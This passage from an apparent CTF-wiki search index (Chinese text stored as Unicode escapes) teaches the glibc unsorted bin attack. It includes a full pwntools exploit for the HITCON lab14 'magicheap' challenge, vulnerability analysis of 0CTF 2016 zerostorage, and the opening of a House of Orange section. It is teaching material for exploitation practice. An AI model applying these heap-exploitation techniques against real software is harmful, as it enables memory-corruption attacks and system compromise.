unsorted_chunks(av);   \u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u5c06 unsorted bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u62ff\u51fa\u6765\u7684\u8fc7\u7a0b\u4e2d\uff0cvictim \u7684 fd \u5e76\u6ca1\u6709\u53d1\u6325\u4f5c\u7528\uff0c\u6240\u4ee5\u5373\u4f7f\u6211\u4eec\u4fee\u6539\u4e86\u5176\u4e3a\u4e00\u4e2a\u4e0d\u5408\u6cd5\u7684\u503c\u4e5f\u6ca1\u6709\u5173\u7cfb\u3002 \u7136\u800c\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cunsorted bin \u94fe\u8868\u53ef\u80fd\u5c31\u6b64\u7834\u574f\uff0c\u5728\u63d2\u5165 chunk \u65f6\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u95ee\u9898\u3002  \u5373\u4fee\u6539 target \u5904\u7684\u503c\u4e3a unsorted bin \u7684\u94fe\u8868\u5934\u90e8 0x7f1c705ffb78\uff0c\u4e5f\u5c31\u662f\u4e4b\u524d\u8f93\u51fa\u7684\u4fe1\u606f\u3002  We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78\nNow emulating a vulnerability that can overwrite the victim- bk pointer\nAnd we write it with the target address-16  ( in  32 -bits machine, it should be target address-8 ) :0x7ffe0d232508\n\nLet s malloc again to get the chunk we just free. During this time, target should has already been rewrite:\n0x7ffe0d232518: 0x7f1c705ffb78  \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u5230 unsorted bin attack \u786e\u5b9e\u53ef\u4ee5\u4fee\u6539\u4efb\u610f\u5730\u5740\u7684\u503c\uff0c\u4f46\u662f\u6240\u4fee\u6539\u6210\u7684\u503c\u5374\u4e0d\u53d7\u6211\u4eec\u63a7\u5236\uff0c\u552f\u4e00\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff0c\u8fd9\u4e2a\u503c\u6bd4\u8f83\u5927\u3002 \u800c\u4e14\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c  \u8fd9\u770b\u8d77\u6765\u4f3c\u4e4e\u5e76\u6ca1\u6709\u4ec0\u4e48\u7528\u5904\uff0c\u4f46\u662f\u5176\u5b9e\u8fd8\u662f\u6709\u70b9\u5375\u7528\u7684\uff0c\u6bd4\u5982\u8bf4   \u6211\u4eec\u901a\u8fc7\u4fee\u6539\u5faa\u73af\u7684\u6b21\u6570\u6765\u4f7f\u5f97\u7a0b\u5e8f\u53ef\u4ee5\u6267\u884c\u591a\u6b21\u5faa\u73af\u3002  \u6211\u4eec\u53ef\u4ee5\u4fee\u6539 heap \u4e2d\u7684 global_max_fast \u6765\u4f7f\u5f97\u66f4\u5927\u7684 chunk \u53ef\u4ee5\u88ab\u89c6\u4e3a fast bin\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u53bb\u6267\u884c\u4e00\u4e9b fast bin attack\u4e86\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#hitcon-training-lab14-magic-heap", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4fee\u6539\u4e00\u4e0b\u6e90\u7a0b\u5e8f\u4e2d\u7684 l33t \u51fd\u6570\uff0c\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\u3002  void   l33t ()   {   system ( cat ./flag );   }", 
            "title": "HITCON Training lab14 magic heap"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_5", 
            "text": "\u279c  hitcontraining_lab14 git: ( master )  file magicheap \nmagicheap: ELF  64 -bit LSB executable, x86-64, version  1   ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,  for  GNU/Linux  2 .6.32, BuildID [ sha1 ]= 9f84548d48f7baa37b9217796c2ced6e6281bb6f, not stripped\n\u279c  hitcontraining_lab14 git: ( master )  checksec magicheap  [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/hitcontraining_lab14/magicheap \n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 )   \u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u662f\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u768464\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u4e0e Canary \u4fdd\u62a4\u3002", 
            "title": "\u57fa\u672c\u4fe1\u606f"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_6", 
            "text": "\u7a0b\u5e8f\u5927\u6982\u5c31\u662f\u81ea\u5df1\u5199\u7684\u5806\u7ba1\u7406\u5668\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u529f\u80fd   \u521b\u5efa\u5806\u3002\u6839\u636e\u7528\u6237\u6307\u5b9a\u5927\u5c0f\u7533\u8bf7\u76f8\u5e94\u5806\uff0c\u5e76\u4e14\u8bfb\u5165\u6307\u5b9a\u957f\u5ea6\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u8bbe\u7f6e NULL\u3002  \u7f16\u8f91\u5806\u3002\u6839\u636e\u6307\u5b9a\u7684\u7d22\u5f15\u5224\u65ad\u5bf9\u5e94\u5806\u662f\u4e0d\u662f\u975e\u7a7a\uff0c\u5982\u679c\u975e\u7a7a\uff0c\u5c31\u6839\u636e\u7528\u6237\u8bfb\u5165\u7684\u5927\u5c0f\uff0c\u6765\u4fee\u6539\u5806\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u5176\u5b9e\u5c31\u51fa\u73b0\u4e86\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002  \u5220\u9664\u5806\u3002\u6839\u636e\u6307\u5b9a\u7684\u7d22\u5f15\u5224\u65ad\u5bf9\u5e94\u5806\u662f\u4e0d\u662f\u975e\u7a7a\uff0c\u5982\u679c\u975e\u7a7a\uff0c\u5c31\u5c06\u5bf9\u5e94\u5806\u91ca\u653e\u5e76\u7f6e\u4e3a NULL\u3002   \u540c\u65f6\uff0c\u6211\u4eec\u770b\u5230\uff0c\u5f53\u6211\u4eec\u63a7\u5236 v3 \u4e3a 4869\uff0c\u540c\u65f6\u63a7\u5236 magic \u5927\u4e8e 4869\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230 flag \u4e86\u3002", 
            "title": "\u57fa\u672c\u529f\u80fd"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_7", 
            "text": "\u5f88\u663e\u7136\uff0c \u6211\u4eec\u76f4\u63a5\u5229\u7528 unsorted bin attack \u5373\u53ef\u3002   \u91ca\u653e\u4e00\u4e2a\u5806\u5757\u5230 unsorted bin \u4e2d\u3002  \u5229\u7528\u5806\u6ea2\u51fa\u6f0f\u6d1e\u4fee\u6539 unsorted bin \u4e2d\u5bf9\u5e94\u5806\u5757\u7684 bk \u6307\u9488\u4e3a  magic-16\u3002  \u89e6\u53d1\u6f0f\u6d1e\u5373\u53ef\u3002   \u4ee3\u7801\u5982\u4e0b  #!/usr/bin/env python  # -*- coding: utf-8 -*-  from   pwn   import   *  r   =   process ( ./magicheap )  def   create_heap ( size ,   content ): \n     r . recvuntil ( : ) \n     r . sendline ( 1 ) \n     r . recvuntil ( : ) \n     r . sendline ( str ( size )) \n     r . recvuntil ( : ) \n     r . sendline ( content )  def   edit_heap ( idx ,   size ,   content ): \n     r . recvuntil ( : ) \n     r . sendline ( 2 ) \n     r . recvuntil ( : ) \n     r . sendline ( str ( idx )) \n     r . recvuntil ( : ) \n     r . sendline ( str ( size )) \n     r . recvuntil ( : ) \n     r . sendline ( content )  def   del_heap ( idx ): \n     r . recvuntil ( : ) \n     r . sendline ( 3 ) \n     r . recvuntil ( : ) \n     r . sendline ( str ( idx ))  create_heap ( 0x20 ,   dada )    # 0  create_heap ( 0x80 ,   dada )    # 1  # in order not to merge into top chunk  create_heap ( 0x20 ,   dada )    # 2  del_heap ( 1 )  magic   =   0x6020c0  fd   =   0  bk   =   magic   -   0x10  edit_heap ( 0 ,   0x20   +   0x20 ,   a   *   0x20   +   p64 ( 0 )   +   p64 ( 0x91 )   +   p64 ( fd )   +   p64 ( bk ))  create_heap ( 0x80 ,   dada )    #trigger unsorted bin attack  r . recvuntil ( : )  r . sendline ( 4869 )  r . interactive ()", 
            "title": "\u5229\u7528"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#2016-0ctf-zerostorage-", 
            "text": "\u6ce8\uff1a\u5f85\u8fdb\u4e00\u6b65\u5b8c\u6210\u3002  \u8fd9\u91cc\u6211\u4eec\u4ee5 2016 \u5e74 0CTF \u7684zerostorage\u4e3a\u4f8b\uff0c\u8fdb\u884c\u4ecb\u7ecd\u3002  \u8fd9\u4e2a\u9898\u5f53\u65f6\u7ed9\u4e86\u670d\u52a1\u5668\u7684\u7cfb\u7edf\u7248\u672c\u548c\u5185\u6838\u7248\u672c\uff0c\u6240\u4ee5\u81ea\u5df1\u53ef\u4ee5\u4e0b\u4e00\u4e2a\u4e00\u6a21\u4e00\u6837\u7684\u8fdb\u884c\u8c03\u8bd5\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u76f4\u63a5\u7528\u81ea\u5df1\u7684\u672c\u5730\u673a\u5668\u8c03\u8bd5\u4e86\u3002\u4f46\u662f\u5728\u76ee\u524d\u7684Ubuntu 16.04 \u4e2d\uff0c\u7531\u4e8e\u8fdb\u4e00\u6b65\u7684\u968f\u673a\u5316\uff0c\u5bfc\u81f4 libc \u52a0\u8f7d\u7684\u4f4d\u7f6e\u4e0e\u7a0b\u5e8f\u6a21\u5757\u52a0\u8f7d\u7684\u4f4d\u7f6e\u4e4b\u95f4\u7684\u76f8\u5bf9\u504f\u79fb\u4e0d\u518d\u56fa\u5b9a\uff0c\u6240\u4ee5 BrieflyX \u7684\u7b56\u7565\u5c31\u65e0\u6cd5\u518d\u6b21\u4f7f\u7528\uff0c\u4f3c\u4e4e\u53ea\u80fd\u7528 angelboy \u7684\u7b56\u7565\u4e86\u3002", 
            "title": "2016 0CTF zerostorage-\u5f85\u5b8c\u6210"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_8", 
            "text": "\u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u5f00\u542f\u4e86\u6240\u6709\u7684\u4fdd\u62a4  pwndbg  checksec  [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/zerostorage/zerostorage \n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    FORTIFY:  Enabled", 
            "title": "\u5b89\u5168\u6027\u68c0\u67e5"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_9", 
            "text": "\u7a0b\u5e8f\u7ba1\u7406\u5728 bss \u6bb5\u7684\u5b58\u50a8\u7a7a\u95f4 storage \uff0c\u5177\u6709\u63d2\u5165\uff0c\u5220\u9664\uff0c\u5408\u5e76\uff0c\u5220\u9664\uff0c\u67e5\u770b\uff0c\u679a\u4e3e\uff0c\u9000\u51fa\u529f\u80fd\u3002\u8fd9\u4e2astorage\u7684\u7ed3\u6784\u4f53\u5982\u4e0b  00000000 Storage         struc ; (sizeof=0x18, mappedto_7)\n00000000                                         ; XREF: .bss:storage_list/r\n00000000 use             dq ?\n00000008 size            dq ?\n00000010 xor_addr        dq ?\n00000018 Storage         ends", 
            "title": "\u57fa\u672c\u529f\u80fd\u5206\u6790"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#insert-1", 
            "text": "\u57fa\u672c\u529f\u80fd\u5982\u4e0b   \u9010\u4e00\u67e5\u770b storage \u6570\u7ec4\uff0c\u67e5\u627e\u7b2c\u4e00\u4e2a\u672a\u4f7f\u7528\u7684\u5143\u7d20\uff0c\u4f46\u662f\u8fd9\u4e2a\u6570\u7ec4\u6700\u5927\u4e5f\u5c31\u662f32\u3002  \u8bfb\u53d6storage \u5143\u7d20\u6240\u9700\u8981\u5b58\u50a8\u5185\u5bb9\u7684\u957f\u5ea6\u3002  \u5982\u679c\u957f\u5ea6\u4e0d\u5927\u4e8e0\uff0c\u76f4\u63a5\u9000\u51fa\uff1b  \u5426\u5219\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u5c0f\u4e8e128\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a128\uff1b  \u5426\u5219\uff0c\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u4e0d\u5927\u4e8e4096\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a\u5bf9\u5e94\u7684\u6570\u503c\uff1b  \u5426\u5219\uff0c\u8bbe\u7f6e\u4e3a4096\u3002    \u4f7f\u7528 calloc \u5206\u914d\u6307\u5b9a\u957f\u5ea6\uff0c\u6ce8\u610f calloc \u4f1a\u521d\u59cb\u5316 chunk \u4e3a0\u3002  \u5c06 calloc \u5206\u914d\u7684\u5185\u5b58\u5730\u5740\u4e0e bss \u6bb5\u7684\u4e00\u4e2a\u5185\u5b58\uff08\u521d\u59cb\u65f6\u523b\u4e3a\u4e00\u4e2a\u968f\u673a\u6570\uff09\u8fdb\u884c\u6291\u6216\uff0c\u5f97\u5230\u4e00\u4e2a\u65b0\u7684\u5185\u5b58\u5730\u5740\u3002  \u6839\u636e\u8bfb\u53d6\u7684storage\u7684\u5927\u5c0f\u6765\u8bfb\u5165\u5185\u5bb9\u3002  \u5c06\u5bf9\u5e94\u7684storage\u7684\u5927\u5c0f\u4ee5\u53ca\u5b58\u50a8\u5185\u5bb9\u7684\u5730\u5740\u4fdd\u5b58\u5230\u5bf9\u5e94\u7684storage \u5143\u7d20\u4e2d\uff0c\u5e76\u6807\u8bb0\u8be5\u5143\u7d20\u5904\u4e8e\u53ef\u7528\u72b6\u6001\u3002 \u4f46\u662f\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u8bb0\u5f55\u7684storage\u7684\u5927\u5c0f\u662f\u81ea\u5df1\u8f93\u5165\u7684\u5927\u5c0f\uff01\uff01\uff01  \u9012\u589e storage num\u7684\u6570\u91cf\u3002", 
            "title": "insert-1"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#update-2", 
            "text": "\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u5b58\u50a8\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002  \u8bfb\u5165\u8981\u66f4\u65b0\u7684storage\u5143\u7d20\u7684id\uff0c\u5982\u679cid\u5927\u4e8e31\u6216\u8005\u76ee\u524d\u5904\u4e8e\u4e0d\u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u8bf4\u660e\u4e0d\u5bf9\uff0c\u76f4\u63a5\u8fd4\u56de\u3002  \u8bfb\u53d6 \u66f4\u65b0\u540e storage \u5143\u7d20\u6240\u9700\u8981\u5b58\u50a8\u5185\u5bb9\u7684\u957f\u5ea6\u3002  \u5982\u679c\u957f\u5ea6\u4e0d\u5927\u4e8e0\uff0c\u76f4\u63a5\u9000\u51fa\uff1b  \u5426\u5219\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u5c0f\u4e8e128\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a128\uff1b  \u5426\u5219\uff0c\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u4e0d\u5927\u4e8e4096\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a\u5bf9\u5e94\u7684\u6570\u503c\uff1b  \u5426\u5219\uff0c\u8bbe\u7f6e\u4e3a4096\u3002    \u6839\u636e bss \u6bb5\u5bf9\u5e94\u7684\u968f\u673a\u6570\u83b7\u53d6\u539f\u5148storage \u5b58\u50a8\u5185\u5bb9\u7684\u5730\u5740\uff0c  \u5982\u679c\u66f4\u65b0\u540e\u6240\u9700\u7684\u957f\u5ea6\u4e0d\u7b49\u4e8e\u66f4\u65b0\u524d\u7684\u957f\u5ea6\uff0c\u5c31\u4f7f\u7528realloc\u4e3a\u5176\u91cd\u65b0\u5206\u914d\u5185\u5b58\u3002  \u518d\u6b21\u8bfb\u53d6\u6570\u636e\uff0c\u540c\u65f6\u66f4\u65b0storage \u5143\u7d20\u3002", 
            "title": "update-2"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#merge-3", 
            "text": "\u5982\u679c\u6b63\u5728\u4f7f\u7528\u7684\u5143\u7d20\u4e0d\u5927\u4e8e1\u4e2a\uff0c\u90a3\u4e48\u65e0\u6cd5\u5408\u5e76\uff0c\u76f4\u63a5\u9000\u51fa\u5373\u53ef\u3002  \u5224\u65adstorage\u662f\u5426\u5df2\u7ecf\u6ee1\u4e86\uff0c\u5982\u679c\u4e0d\u6ee1\uff0c\u627e\u51fa\u7a7a\u95f2\u7684\u90a3\u4e00\u5757\u3002  \u5206\u522b\u8bfb\u53d6merge_from\u7684id\u4ee5\u53camerge_to\u7684id\u53f7\uff0c\u5e76\u8fdb\u884c\u76f8\u5e94\u5927\u5c0f\u4ee5\u53ca\u4f7f\u7528\u72b6\u6001\u7684\u68c0\u6d4b\u3002  \u6839\u636e\u6700\u521d\u7528\u6237\u8f93\u5165\u7684\u5927\u5c0f\u6765\u8ba1\u7b97\u4e24\u4e2a merge \u5230\u4e00\u8d77\u540e\u6240\u9700\u8981\u7684\u7a7a\u95f4\uff0c \u5982\u679c\u4e0d\u5927\u4e8e128\uff0c\u90a3\u5c31\u4e0d\u4f1a\u7533\u8bf7\u65b0\u7684\u7a7a\u95f4 \uff0c\u5426\u5219\u5c31\u7533\u8bf7\u76f8\u5e94\u5927\u5c0f\u7684\u65b0\u7684\u7a7a\u95f4\u3002  \u4f9d\u6b21\u5c06merge_to\u4e0emerge_from\u7684\u5185\u5bb9\u62f7\u8d1d\u5230\u76f8\u5bf9\u5e94\u7684\u4f4d\u7f6e\u3002  \u6700\u540e\u5b58\u50a8merge_from\u5185\u5bb9\u7684\u5185\u5b58\u5730\u5740\u88ab\u91ca\u653e\u4e86\uff0c\u4f46\u5e76\u6ca1\u6709\u88ab\u7f6e\u4e3aNULL\u3002\u540c\u65f6\uff0c\u5b58\u653emerge_to\u5185\u5bb9\u7684\u5185\u5b58\u5730\u5740\u5e76\u6ca1\u6709\u88ab\u91ca\u653e\uff0c\u76f8\u5e94\u7684storage\u7684\u6291\u6216\u540e\u7684\u5730\u5740\u53ea\u662f\u88ab\u7f6e\u4e3a\u4e86NULL\u3002   \u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\uff0c\u5728merge\u7684\u65f6\u5019\uff0c\u5e76\u6ca1\u6709\u68c0\u6d4b\u4e24\u4e2astorage\u7684ID\u662f\u5426\u76f8\u540c\u3002", 
            "title": "merge-3"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#delete-4", 
            "text": "\u5982\u679c\u6ca1\u6709\u5b58\u50a8\u4efb\u4f55\u5143\u7d20\uff0c\u90a3\u5c31\u76f4\u63a5\u8fd4\u56de\u3002  \u8bfb\u53d6\u6307\u5b9a\u8981\u4fee\u6539\u7684storage\u7684\u5143\u7d20\u7684id\uff0c\u5982\u679c id \u5927\u4e8e32\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002  \u5982\u679c storage  \u7684\u5bf9\u5e94\u5143\u7d20\u5e76\u4e0d\u5728\u4f7f\u7528\u72b6\u6001\uff0c\u90a3\u4e48\u4e5f\u540c\u65f6\u8fd4\u56de\u3002  \u4e4b\u540e\u5c31\u662f\u5c06\u5143\u7d20\u5bf9\u5e94\u7684\u5b57\u6bb5\u5206\u522b\u8bbe\u7f6e\u4e3aNULL\uff0c\u5e76\u4e14\u91ca\u653e\u5bf9\u5e94\u7684\u5185\u5b58\u3002", 
            "title": "delete-4"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#view-5", 
            "text": "\u5982\u679c\u6ca1\u6709\u5b58\u50a8\u4efb\u4f55\u5143\u7d20\uff0c\u90a3\u5c31\u76f4\u63a5\u8fd4\u56de\u3002  \u8bfb\u53d6\u6307\u5b9a\u8981\u4fee\u6539\u7684storage\u7684\u5143\u7d20\u7684id\uff0c\u5982\u679c id \u5927\u4e8e32\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002  \u5982\u679c storage  \u7684\u5bf9\u5e94\u5143\u7d20\u5e76\u4e0d\u5728\u4f7f\u7528\u72b6\u6001\uff0c\u90a3\u4e48\u4e5f\u540c\u65f6\u8fd4\u56de\u3002  \u8f93\u5165\u5bf9\u5e94\u7684storage \u7684\u5185\u5bb9\u3002", 
            "title": "view-5"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#list-6", 
            "text": "\u5982\u679c\u6ca1\u6709\u5b58\u50a8\u4efb\u4f55\u5143\u7d20\uff0c\u90a3\u5c31\u76f4\u63a5\u8fd4\u56de\u3002  \u8bfb\u53d6\u6307\u5b9a\u8981\u4fee\u6539\u7684storage\u7684\u5143\u7d20\u7684id\uff0c\u5982\u679c id \u5927\u4e8e32\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002  \u904d\u5386\u6240\u6709\u6b63\u5728\u4f7f\u7528\u7684storage\uff0c\u8f93\u5165\u5176\u5bf9\u5e94\u7684\u4e0b\u6807\u4ee5\u53ca\u5bf9\u5e94storage\u7684\u5927\u5c0f\u3002", 
            "title": "list-6"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_10", 
            "text": "\u901a\u8fc7\u8fd9\u4e48\u7b80\u5355\u7684\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5 \u57fa\u672c\u786e\u5b9a\u6f0f\u6d1e\u4e3b\u8981\u5c31\u662f\u96c6\u4e2d\u5728insert\u64cd\u4f5c\u4e0emerge\u64cd\u4f5c\u4e2d\uff0c\u5c24\u5176\u662f\u5f53\u6211\u4eecmerge\u4e24\u4e2a\u8f83\u5c0fsize\u7684storage\u65f6\uff0c\u4f1a\u51fa\u73b0\u4e00\u4e9b\u95ee\u9898\u3002  \u6211\u4eec\u6765\u5177\u4f53\u5206\u6790\u4e00\u4e0b\uff0c\u5982\u679c\u6211\u4eec\u5728insert\u8fc7\u7a0b\u4e2d\u63d2\u5165\u8f83\u5c0f\u7684size\uff08\u6bd4\u59828\uff09\u7684storage  A\uff0c\u90a3\u4e48\uff0c\u5f53\u6211\u4eec\u8fdb\u884cmerge\u65f6\uff0c\u5047\u8bbe\u6211\u4eec\u9009\u62e9merge\u7684\u4e24\u4e2astorage \u90fd\u4e3aA\uff0c\u90a3\u4e48\u6b64\u65f6\u7a0b\u5e8f\u4f1a\u76f4\u63a5\u628a\u5c31\u4f1a\u76f4\u63a5\u628aA\u7684\u5185\u5bb9\u518d\u6dfb\u52a0\u5230A\u7684\u539f\u6709\u5185\u5bb9\u7684\u540e\u9762\uff0c\u7136\u540e\u63a5\u7740\u5c31\u4f1a\u628aA\u5bf9\u5e94\u7684\u5b58\u50a8\u6570\u636e\u90e8\u5206\u7684\u5185\u5b58free\u6389\uff0c\u4f46\u662f\u8fd9\u5e76\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\uff0c\u56e0\u4e3aA\u5b58\u50a8\u5185\u5bb9\u7684\u5730\u5740\u88ab\u8d4b\u7ed9\u4e86\u53e6\u5916\u4e00\u4e2astorage\uff0c\u5f53\u518d\u8bbf\u95eemerge \u540e\u7684 storage B\u90e8\u5206\u7684\u5185\u5bb9\u65f6\uff0c\u7531\u4e8eB\u7684\u5b58\u50a8\u6570\u636e\u90e8\u5206\u7684\u5730\u5740\u5176\u5b9e\u5c31\u662fA\u5bf9\u5e94\u7684\u5b58\u50a8\u6570\u636e\u7684\u5730\u5740\uff0c\u6240\u4ee5\u6253\u5370\u7684\u5c31\u662fA\u7684\u6570\u636e\u90e8\u5206\u7684\u5185\u5bb9\u3002\u4f46\u662f\uff0c\u6211\u4eec\u4e4b\u524d\u521a\u521a\u628aA\u5bf9\u5e94\u7684\u5185\u5b58\u91ca\u653e\u6389\uff0c\u800cA\u7531\u4e8e\u4e0d\u5728fast bin\u8303\u56f4\u5185\uff0c\u6240\u4ee5\u53ea\u4f1a\u88ab\u653e\u5230unsorted bin\u4e2d\uff08\u800c\u4e14\u6b64\u65f6\u53ea\u6709\u4e00\u4e2a\uff09\uff0c\u6240\u4ee5\u6b64\u65f6A\u7684fd\u548cbk\u90fd\u5b58\u653e\u7684\u662funsorted bin\u7684\u4e00\u4e2a\u57fa\u5730\u5740\u3002  \u5982\u679c\u6211\u4eec\u5728merge\u4e4b\u524d\u66fe\u7ecf\u5220\u9664\u8fc7\u4e00\u4e2astorage C\uff0c\u90a3\u4e48\u5728\u6211\u4eecmerge A\u540e\uff0cA\u5c31\u4f1a\u63d2\u5728unsorted bin\u7684\u53cc\u5411\u94fe\u8868\u7684\u9996\u90e8\uff0c\u6240\u4ee5\u5176fd\u5219\u662fC\u5bf9\u5e94\u7684\u5730\u5740\uff0cbk\u5219\u662funsorted bin\u7684\u4e00\u4e2a\u57fa\u5730\u5740\u3002\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u6cc4\u9732\u4e24\u4e2a\u5730\u5740\u3002  \u800c\u4e14\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u8fd8\u662f\u53ef\u4ee5\u53bb\u4fee\u6539merge\u540e\u7684B\u7684\u5185\u5bb9\u7684\uff0c\u6240\u4ee5\u8fd9\u5176\u5b9e\u5c31\u662f\u4e2aUse After Free\u3002", 
            "title": "\u6f0f\u6d1e\u786e\u5b9a"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_11", 
            "text": "\u3002\u3002\u3002\u3002", 
            "title": "\u5229\u7528\u6d41\u7a0b"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_12", 
            "text": "", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_13", 
            "text": "http://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/  https://github.com/HQ1995/Heap_Senior_Driver/tree/master/0ctf2016/zerostorage  https://github.com/scwuaptx/CTF/blob/master/2016-writeup/0ctf/zerostorage.py", 
            "title": "\u53c2\u8003\u6587\u732e"
        }, 
        {
            "location": "/pwn/heap/house_of_orange/", 
            "text": "House of Orange\n\n\n\u4ecb\u7ecd\n\n\nHouse of Orange\u4e0e\u5176\u4ed6\u7684House of XX\u5229\u7528\u65b9\u6cd5\u4e0d\u540c\uff0c\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u6765\u81ea\u4e8eHitcon CTF 2016\u4e2d\u7684\u4e00\u9053\u540c\u540d\u9898\u76ee\u3002\u7531\u4e8e\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u5728\u6b64\u524d\u7684CTF\u9898\u76ee\u4e2d\u6ca1\u6709\u51fa\u73b0\u8fc7\uff0c\u56e0\u6b64\u4e4b\u540e\u51fa\u73b0\u7684\u4e00\u7cfb\u5217\u884d\u751f\u9898\u76ee\u7684\u5229\u7528\u65b9\u6cd5\u6211\u4eec\u79f0\u4e4b\u4e3aHouse of Orange\u3002\n\n\n\u6982\u8ff0\n\n\nHouse of Orange\u7684\u5229\u7528\u6bd4\u8f83\u7279\u6b8a\uff0c\u9996\u5148\u9700\u8981\u76ee\u6807\u6f0f\u6d1e\u662f\u5806\u4e0a\u7684\u6f0f\u6d1e\u4f46\u662f\u7279\u6b8a\u4e4b\u5904\u5728\u4e8e\u9898\u76ee\u4e2d\u4e0d\u5b58\u5728free\u51fd\u6570\u6216\u5176\u4ed6\u91ca\u653e\u5806\u5757\u7684\u51fd\u6570\u3002\u6211\u4eec\u77e5\u9053\u4e00\u822c\u60f3\u8981\u5229\u7528\u5806\u6f0f\u6d1e\uff0c\u9700\u8981\u5bf9\u5806\u5757\u8fdb\u884cmalloc\u548cfree\u64cd\u4f5c\uff0c\u4f46\u662f\u5728House of Orange\u5229\u7528\u4e2d\u65e0\u6cd5\u4f7f\u7528free\u51fd\u6570\uff0c\u56e0\u6b64House of Orange\u6838\u5fc3\u5c31\u662f\u901a\u8fc7\u6f0f\u6d1e\u5229\u7528\u83b7\u5f97free\u7684\u6548\u679c\u3002\n\n\n\u539f\u7406\n\n\n\u5982\u6211\u4eec\u524d\u9762\u6240\u8ff0\uff0cHouse of Orange\u7684\u6838\u5fc3\u5728\u4e8e\u5728\u6ca1\u6709free\u51fd\u6570\u7684\u60c5\u51b5\u4e0b\u5f97\u5230\u4e00\u4e2a\u91ca\u653e\u7684\u5806\u5757(unsorted bin)\u3002\n\u8fd9\u79cd\u64cd\u4f5c\u7684\u539f\u7406\u7b80\u5355\u6765\u8bf4\u662f\u5f53\u524d\u5806\u7684top chunk\u5c3a\u5bf8\u4e0d\u8db3\u4ee5\u6ee1\u8db3\u7533\u8bf7\u5206\u914d\u7684\u5927\u5c0f\u7684\u65f6\u5019\uff0c\u539f\u6765\u7684top chunk\u4f1a\u88ab\u91ca\u653e\u5e76\u88ab\u7f6e\u5165unsorted bin\u4e2d\uff0c\u901a\u8fc7\u8fd9\u4e00\u70b9\u53ef\u4ee5\u5728\u6ca1\u6709free\u51fd\u6570\u60c5\u51b5\u4e0b\u83b7\u53d6\u5230unsorted 